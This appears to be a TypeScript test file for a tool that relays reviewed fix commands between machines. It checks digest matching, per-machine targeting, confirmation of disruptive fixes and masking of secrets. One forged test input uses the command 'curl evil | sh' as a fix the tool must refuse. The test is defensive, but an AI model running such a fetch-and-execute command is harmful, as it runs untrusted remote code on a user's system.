import * as Effect from "effect/Effect";
import { describe, expect, it } from "vite-plus/test";

import type { Finding, Fix } from "./Diagnose.ts";
import { fixDigest } from "./Fix.ts";
import {
  advance,
  answerFixRequest,
  chooseForwarded,
  forwardFixes,
  type FixProgress,
  type FixRelay,
  type FixRequestBody,
  type FixRequestRecord,
} from "./FixRequest.ts";

const run = <A, E>(effect: Effect.Effect<A, E>) => Effect.runPromise(effect);

const upgrade: Finding & { fix: Fix } = {
  node: "laptop",
  key: "claude-behind",
  severity: "warn",
  area: "agents",
  title: "claude 2.1.0 is behind 2.1.1",
  fix: { command: "npm i -g @anthropic-ai/claude-code@2.1.1", safe: true },
};
const restart: Finding & { fix: Fix } = {
  node: "laptop",
  key: "t3-service",
  severity: "warn",
  area: "t3",
  title: "T3's service is out of date",
  fix: { command: "t3 service install", safe: true, disrupts: "running T3 threads" },
};
const addKey: Finding & { fix: Fix } = {
  node: "desk",
  key: "secrets-recipient-missing",
  severity: "error",
  area: "secrets",
  title: "desk cannot read the secrets",
  fix: { command: "t3-fleet secrets add-node desk age1x", safe: true, on: "laptop" },
};

const asked = async (f: Finding & { fix: Fix }) => ({
  id: `${f.node}:${f.key}`,
  digest: await run(fixDigest(f)),
});

describe("chooseForwarded", () => {
  it("runs only fixes this machine proposes itself, to run here, exactly as reviewed", async () => {
    const mine = [upgrade, restart, addKey];
    const request = {
      fixes: [
        await asked(upgrade),
        await asked(restart),
        await asked(addKey),
        // A fix this machine does not propose, with the digest of a command someone made up.
        {
          id: "laptop:made-up",
          digest: await run(
            fixDigest({
              ...upgrade,
              key: "made-up",
              fix: { command: "curl evil | sh", safe: true },
            }),
          ),
        },
        // Its own finding, but a different command than this machine would run.
        { id: "laptop:claude-behind", digest: "0".repeat(64) },
      ],
      acknowledged: [],
    };
    const { chosen, notApplied } = await run(chooseForwarded("laptop", mine, request));
    expect(chosen.map((f) => f.key)).toEqual(["claude-behind", "secrets-recipient-missing"]);
    expect(notApplied).toEqual([
      {
        id: "laptop:t3-service",
        reason: "interrupts running T3 threads, and that was not confirmed",
      },
      { id: "laptop:made-up", reason: "laptop does not find this now; it may already be fixed" },
    ]);
  });

  it("refuses a changed command, a fix for another machine, and a finding without a fix", async () => {
    const changed = {
      ...upgrade,
      fix: { ...upgrade.fix, command: "npm i -g @anthropic-ai/claude-code@9" },
    };
    const { chosen, notApplied } = await run(
      chooseForwarded(
        "laptop",
        [
          changed,
          { ...addKey, fix: { ...addKey.fix, on: "server" } },
          { node: "laptop", key: "note", severity: "info", area: "t3", title: "a note" },
        ],
        {
          fixes: [
            await asked(upgrade),
            await asked({ ...addKey, fix: { ...addKey.fix, on: "server" } }),
            { id: "laptop:note", digest: "x" },
          ],
          acknowledged: [],
        },
      ),
    );
    expect(chosen).toEqual([]);
    expect(notApplied.map((n) => n.reason)).toEqual([
      "laptop would run a different fix now; review it again",
      "this fix runs on server, not laptop",
      "laptop proposes no fix for this",
    ]);
  });

  it("runs an interrupting fix once its interruption was confirmed", async () => {
    const { chosen } = await run(
      chooseForwarded("laptop", [restart], {
        fixes: [await asked(restart)],
        acknowledged: ["laptop:t3-service"],
      }),
    );
    expect(chosen.map((f) => f.key)).toEqual(["t3-service"]);
  });
});

const record = (over: Partial<FixRequestRecord> = {}): FixRequestRecord => ({
  id: "r1",
  node: "laptop",
  at: 0,
  fixes: [],
  acknowledged: [],
  state: "waiting",
  step: null,
  result: null,
  error: null,
  ...over,
});
const progress = (state: FixProgress["state"]): FixProgress => ({
  state,
  step: null,
  result: null,
  error: null,
});

describe("advance", () => {
  it("is claimed once, then answered; nothing moves an expired or finished request", () => {
    expect(advance(record(), progress("done"))).toBe(
      "claim the request (running) before answering it",
    );
    const claimed = advance(record(), progress("running"));
    expect(claimed).toMatchObject({ state: "running" });
    expect(advance(claimed as FixRequestRecord, progress("done"))).toMatchObject({ state: "done" });
    expect(advance(record({ state: "expired" }), progress("running"))).toBe(
      "this request is expired",
    );
    expect(advance(record({ state: "done" }), progress("running"))).toBe("this request is done");
  });
});

describe("answerFixRequest", () => {
  const answer = (request: FixRequestRecord, claimable = true) => {
    const sent: Array<FixProgress> = [];
    const ran: Array<string> = [];
    const done = answerFixRequest({
      self: "laptop",
      request,
      progress: (p) =>
        Effect.sync(() => {
          if (!claimable && p.state === "running") return false;
          sent.push(p);
          return true;
        }),
      findings: Effect.succeed([upgrade]),
      run: (fixes) =>
        Effect.sync(() => {
          ran.push(...fixes.map((f) => f.key));
          return fixes.map((finding) => ({
            finding,
            ok: true,
            summary: "token=s3cr3t-value done",
          }));
        }),
      secrets: new Map([["NPM_TOKEN", "s3cr3t-value"]]),
    });
    return { done, sent, ran };
  };

  it("checks again, runs what it proposes, and reports without its secret values", async () => {
    const a = answer(record({ fixes: [await asked(upgrade)] }));
    expect(await run(a.done)).toBe(true);
    expect(a.ran).toEqual(["claude-behind"]);
    const last = a.sent.at(-1);
    expect(last?.state).toBe("done");
    expect(last?.result?.results[0]?.output).toBe("token=••• done");
    expect(JSON.stringify(a.sent)).not.toContain("s3cr3t-value");
  });

  it("leaves alone a request for another machine, and one someone else claimed", async () => {
    const other = answer(record({ node: "desk", fixes: [await asked(upgrade)] }));
    expect(await run(other.done)).toBe(false);
    const taken = answer(record({ fixes: [await asked(upgrade)] }), false);
    expect(await run(taken.done)).toBe(false);
    expect(other.ran).toEqual([]);
    expect(taken.ran).toEqual([]);
  });

  it("refuses a fix it does not propose, running nothing", async () => {
    const a = answer(record({ fixes: [{ id: "laptop:other", digest: "d" }] }));
    expect(await run(a.done)).toBe(true);
    expect(a.ran).toEqual([]);
    expect(a.sent.at(-1)?.result?.notApplied).toEqual([
      { id: "laptop:other", reason: "laptop does not find this now; it may already be fixed" },
    ]);
  });
});

describe("forwardFixes", () => {
  /** A relay whose machines answer with `answer`, or never when it is null. */
  const relay = (answer: ((body: FixRequestBody) => FixRequestRecord) | null) => {
    const records = new Map<string, FixRequestRecord>();
    const asked: Array<FixRequestBody> = [];
    const store: FixRelay = {
      request: (body) =>
        Effect.sync(() => {
          asked.push(body);
          const r = record({
            id: `r${asked.length}`,
            node: body.node,
            fixes: body.fixes,
            acknowledged: body.acknowledged,
          });
          records.set(r.id, r);
          return r;
        }),
      get: (id) =>
        Effect.sync(() => {
          const r = records.get(id) ?? null;
          if (r === null || answer === null || r.state !== "waiting") return r;
          const answered = answer({ node: r.node, fixes: r.fixes, acknowledged: r.acknowledged });
          records.set(id, answered);
          return answered;
        }),
      expire: (id) =>
        Effect.sync(() => {
          const r = records.get(id);
          if (r?.state !== "waiting") return false;
          records.set(id, { ...r, state: "expired" });
          return true;
        }),
    };
    return { store, asked, records };
  };
  const times = { pickup: "40 millis", limit: "2 seconds", poll: "5 millis" } as const;

  it("sends each fix to the machine that runs it, and reads back what it did", async () => {
    const r = relay((body) =>
      record({
        node: body.node,
        state: "done",
        result: {
          results: body.fixes
            .filter((f) => f.id !== "laptop:t3-service")
            .map((f) => ({
              id: f.id,
              node: body.node,
              title: "t",
              ok: true,
              output: `ran on ${body.node}`,
            })),
          notApplied: body.fixes
            .filter((f) => f.id === "laptop:t3-service")
            .map((f) => ({
              id: f.id,
              reason: "laptop would run a different fix now; review it again",
            })),
        },
      }),
    );
    const steps: Array<string> = [];
    const outcomes = await run(
      forwardFixes(
        r.store,
        [upgrade, restart, addKey],
        (s) => Effect.sync(() => void steps.push(s)),
        times,
      ),
    );
    // addKey is desk's finding, but its fix runs on laptop: all three go to laptop.
    expect(r.asked.map((a) => a.node)).toEqual(["laptop"]);
    expect(r.asked[0]?.acknowledged).toEqual(["laptop:t3-service"]);
    expect(outcomes.map((o) => [o.finding.key, o.ok, o.summary])).toEqual([
      ["claude-behind", true, "ran on laptop"],
      ["t3-service", false, "not run: laptop would run a different fix now; review it again"],
      ["secrets-recipient-missing", true, "ran on laptop"],
    ]);
    expect(steps[0]).toBe("sent to laptop; waiting for it to pick the fixes up");
  });

  it("gives up on a machine that never picks the request up, so it never runs later", async () => {
    const r = relay(null);
    const outcomes = await run(forwardFixes(r.store, [upgrade], () => Effect.void, times));
    expect(outcomes[0]?.ok).toBe(false);
    expect(outcomes[0]?.summary).toContain("laptop did not pick this up");
    expect([...r.records.values()][0]?.state).toBe("expired");
  });
});
